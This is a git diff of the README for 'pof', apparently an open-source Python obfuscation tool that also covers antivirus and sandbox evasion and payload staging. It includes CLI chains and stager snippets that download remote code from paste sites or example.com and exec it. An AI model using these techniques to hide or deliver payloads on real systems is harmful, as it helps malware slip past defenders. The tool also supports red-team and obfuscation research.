@@ -45,6 +45,7 @@ pof will allow you to:
 - do **evasion**: AV, EDR, DPI, sandbox and other analysis techniques
 - slow **analysis**: slow down human analysis of the payload
 - enable **automation**: automate the whole process, to produce numerous variant of the payload
+- be **cross-platform**: works on Linux, Windows, and macOS
 - have **fun**: because it's always fun to see what's possible to do with Python
 
 This project also tries to combine all other Python obfuscation tools available, because most of them only provide a single method, and it's pretty basic. So you should be able to do everything that those other tools do, but without having to use multiple.
@@ -55,19 +56,9 @@ This project could also give you ideas to implement in other languages, such as 
 
 You could also use most of the stagers to stage payload that are not built in Python.
 
-## Shortcomings
-
-Any obfuscation techniques that add code complexity will make the code run slower. For most usage this won't have an impact, and no one is using Python for speed anyway (at least I hope).
-
-Encoding, compression, encryption will slow the start of the programs, because it will first have to decode, de-compress, or decrypt it.
-
-Strings, numbers, builtin, obfuscators will make the code run slower, because they will add complexity to many parts of it.
-
-And finally the 'classical' techniques, names, definitions won't have an impact on the speed of the code, because they'll simply rename elements of the code.
-
 ## Install
 
-There are 3 installation options, with PIP, a virtualenv, or a Docker container.
+There are 4 installation options, with PIP, a virtualenv, a Docker container, or with Nix.
 
 ### 1. PIP
 
@@ -104,36 +95,48 @@ Run inside Docker from a file.
 docker run --rm -v $(pwd):/tmp -it pof -o /tmp/output.py /tmp/input.py
 ```
 
+### 4. Nix
+
+From [github.com/onix-sec/nixsecpkgs](https://github.com/onix-sec/nixsecpkgs):
+
+```bash
+nix shell github:onix-sec/nixsecpkgs#pof
+```
+
 ## Usage
 
-You can either pipe or give a file for input, same for output.
-
 ```bash
+# pipe input and output to stdout
 echo "print('Hello, world')" | pof
-```
 
-Output:
+# output to file
+pof in.py -o out.py
 
-```python
-from base64 import b64decode as CRT_ASSERT
-from base64 import b85decode as _45802
-UserClassSlots=__builtins__.__dict__.__getitem__(_45802(''[::-1]).decode().join([__builtins__.__getattribute__("".join([chr(ord(i)-3)for i in'ukf'[::-1]]))(__builtins__.__getattribute__('\u006f\u0072\u0064')(i)-(__name__.__eq__.__call__(__name__)+__name__.__eq__.__call__(__name__)+__name__.__eq__(__name__)))for i in CRT_ASSERT('c3VscXc=').decode()]))
-UserClassSlots(CRT_ASSERT('').decode().join([__builtins__.__getattribute__("".join([chr(ord(i)-3)for i in'']).join([chr(ord(i)-3)for i in'parse_intermixed_argsu'.replace('parse_intermixed_args','fk')]))(__builtins__.__dict__.__getitem__(_45802('L}g}jVP{fhb9HQVa%2').decode().replace("".join([chr(ord(i)-3)for i in'GhiudjUhvxow']),'o'[::-1]))(i)-(__name__.__eq__.__call__(__name__)+globals()["".join([chr(ord(i)-3)for i in'bbvqlwolxebb'])[::-1]].__dict__["".join([chr(ord(i)-3)for i in'']).join([chr(ord(i)-3)for i in'Wuxsimple_stmt'.replace('simple_stmt','h')])]+(type(1)==type(1))))for i in'gourz#/r_pfK'[::-1].replace(_45802('W^i9}').decode(),CRT_ASSERT('aG9vcg==').decode())]))
-```
+# redirect to file
+pof in.py > out.py
 
-And yes, this is a valid Python script, that actually runs and only output `Hello world` ! And you'll get a different output each time.
+# pipe to python to run it
+pof in.py | python
 
-Using a specific obfuscator:
-
-```bash
+# obfuscator
 pof in.py -o out.py -f obfuscator -k BuiltinsObfuscator
+
+# stager
+pof in.py -o out.py -f stager -k PasteRsStager
+
+# evasion
+pof in.py -o out.py -f evasion -k CPUCountEvasion
+
+# evasion with custom params
+pof in.py -o out.py -f evasion -k CPUCountEvasion min_cpu_count=4
+
+# combine everything from the CLI
+pof in.py -f obfuscator -k BuiltinsObfuscator |\
+    pof -f evasion -k CPUCountEvasion min_cpu_count=4 |\
+    pof -f stager -k PasteRsStager > out.py
 ```
 
-Using a specific payload:
-
-```bash
-pof inf.py -o out.py -f payload -k GzipPayload
-```
+You can also use the Python API directly, you can find examples in the corresponding directory or bellow.
 
 ## Examples
 
@@ -157,40 +160,24 @@ echo "print('Hello, world')" | pof -f obfuscator -k UUIDObfuscator | python
 
 #### StringsObfuscator
 
-Reverse.
-
 ```python
+# Reverse
 print('dlrow ,olleH'[::-1])
-```
 
-Replace.
-
-```python
+# Replace
 rint('Helnelemd'.replace('nelem','lo, worl'))
-```
 
-Unicode.
-
-```python
+# Unicode
 print('\u0048\u0065\u006c\u006c\u006f\u002c\u0020\u0077\u006f\u0072\u006c\u0064')
-```
 
-Shift cipher.
-
-```python
+# Shift cipher
 print("".join([chr(ord(i)-3)for i in'Khoor/#zruog']))
-```
 
-Base 64 encoding.
-
-```python
+# Base 64 encoding
 from base64 import b64decode
 print(b64decode( b'SGVsbG8sIHdvcmxk').decode())
-```
 
-Base 85.
-
-```python
+# Base 85
 from base64 import b85decode
 print(b85decode( b'NM&qnZ!92pZ*pv8').decode())
 ```
@@ -199,33 +186,20 @@ print(b85decode( b'NM&qnZ!92pZ*pv8').decode())
 
 Source: `print(42)`
 
-String.
-
 ```python
+# String
 print(int('42'))
-```
 
-Addition.
-
-```python
+# Addition
 print((int(35+7)))
-```
 
-Hex.
-
-```python
+# Hex
 print(int('0x2a',0))
-```
 
-Len.
-
-```python
+# Len
 print(len('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'))
-```
 
-Boolean.
-
-```python
+# Boolean
 print((True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True))
 ```
 
@@ -253,17 +227,11 @@ Obfuscate builtins functions using one of the following methods.
 
 ```python
 __builtins__.__getattribute__('print')('Hello, world')
-```
 
-```python
 __builtins__.__dict__['print']('Hello, world')
-```
 
-```python
 globals()['__builtins__'].__dict__['print']('Hello, world')
-```
 
-```python
 __builtins__.__dict__.__getitem__('print')('Hello, world')
 ```
 
@@ -511,7 +479,7 @@ print(oct.__doc__[8])
 
 ```python
 from urllib import request
-exec(request.urlopen("http://link...").read())
+exec(request.urlopen("https://example.com/payload.py").read())
 ```
 
 #### ImageStager
@@ -547,7 +515,14 @@ from urllib import request
 exec(request.urlopen("https://pastebin.com/raw/...").read())
 ```
 
-The `PasteRsStager` and `Cl1pNetStager` are exactly the same, but the code is not uploaded to the same site.
+> [!NOTE]
+> You'll need to add a pastebin API key:
+>
+> ```bash
+> echo "print('Hello, world')" | pof -f stager -k PastebinStager api_dev_key=foo
+> ```
+
+The `PasteRsStager` and `Cl1pNetStager` are exactly the same, but the code is not uploaded to the same site. But `PasteRsStager` doesn't require an API key.
 
 #### RC4Stager
 
@@ -598,6 +573,12 @@ For this example, the randomly generated key is:
 TzyaoOa2e4wimAo1AGgeWO5ztZtLzqWo5Wl9OXLWP0r5QmjFO8VvIao6NfqHxMBZCXekiqGDcmFugz10F2wS8UlOtUJB2muLsSxVWoJhq1fKWaZHbiYPd7SSdPhqHMRV1fQkJax5sLssaB43AlHFrx4rJYMvkCjPebHUdjW2l0c8af5cNs60v4dRE3zw2myNZTcrbsbpvogSGYOz21rAXlEZn2y0lbDIpWwI1ZHf8i5vAGxnPPPH9i7OQIMZEunerDbY7cyzHRcZGU1nsVyEmlILGf37NYTxLagRkC6GJP5NCmqboyP5It6bF6AuihUkjLTXTMvrgxfNlMs4g3BkHqZIGjNxFHj6zSB3jhOtOQ9l3zOG36dsMKSye78Xxmn7JjoW5nH76E05QJMBALapu0LaVppSSpSUrpYR2bmwGdbuJNZd7qLL6Yy6vNptSIKcG6Vi6DiFLk7afCw9h9fLdyUC1Ng1sGwt0Jhdf0XnuBedFx6diWYzCrYgWZeM1VnC
 ```
 
+So we could call it like this:
+
+```bash
+python3 out.py TzyaoO...
+```
+
 #### QuineStager
 
 ```python
@@ -609,6 +590,24 @@ def quine():
  return untokenize(tokens[:12])+repr(esource)+untokenize(tokens[12:15])+repr(tokens)+untokenize(tokens[15:])
 exec(b64decode(esource))
 ```
+
+This is most likely useless, a quine is a program that output its source code, and you can generate a quine from your source code with this.
+
+Your script will still execute but a new function `quine` will be available, if you call it you'll have access to the source.
+
+Example usage:
+
+```bash
+echo "print(quine())" | pof -f stager -k QuineStager > out.py
+python3 out.py > out2.py
+python3 out2.py > out3.py
+diff out2.py out3.py
+```
+
+The `out2.py` and `out3.py` files are identical, they both contain the source code, and the script `print(quine())`.
+
+> [!NOTE]
+> By default pof uses a custom `Untokenizer` that removes useless spaces (`NoSpaceUntokenizer` defined in `./pof/utils/tokens.py`), so first generation (in the example `out.py`) will not have spaces present in the subsquent outputs.
 
 ### Generators
 
@@ -835,9 +834,13 @@ black .
 ruff .
 ```
 
+## Python 2
+
+No effort is made to support Python 2, most obfuscator, stagers, and evasion should work out of the box, but they are not tested.
+
 ## TODO
 
-- Get the version (in setup.py) from `__init__.py`
+- Add option to prepend a shebang, and add ability to customize it
 
 ## License
 
